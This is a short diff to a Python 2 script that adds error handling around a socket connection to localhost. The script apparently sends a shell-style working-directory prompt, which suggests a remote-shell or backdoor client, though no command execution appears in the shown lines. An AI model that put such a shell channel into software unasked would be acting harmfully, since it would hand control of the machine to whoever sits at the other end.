@@ -1,3 +1,4 @@
+import sys
 import socket
 import subprocess
 import Queue
@@ -8,10 +9,12 @@ import shell_commands
 
 marker = chr(255)
 
-comm_socket = socket.socket()
-comm_socket.connect(("127.0.0.1",80))
-comm_socket.sendall("\n"+os.getcwd()+">"+marker)
-
+try:
+    comm_socket = socket.socket()
+    comm_socket.connect(("127.0.0.1",80))
+    comm_socket.sendall("\n"+os.getcwd()+">"+marker)
+except socket.error:
+    sys.exit("Can't connect to host!")
 output_queue = Queue.Queue()
 
 class MessageHandler:
